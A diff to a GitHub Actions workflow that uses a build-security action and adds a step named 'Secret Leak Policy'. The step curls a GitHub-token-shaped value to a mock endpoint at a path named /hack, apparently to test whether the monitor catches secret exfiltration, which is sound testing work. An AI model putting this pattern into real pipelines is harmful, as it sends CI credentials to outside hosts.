@@ -21,6 +21,7 @@ jobs:
     name: Sync fork and Run build
 
     steps:
+
       - name: Setup PSE
         uses: invisirisk/pse-action@develop
         with:
@@ -29,6 +30,14 @@ jobs:
           # collect_dependencies: false
           # mode: sidecar
           debug: true
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+          echo "Exit code: $?"
       - name: Checkout repository
         uses: actions/checkout@v4
 
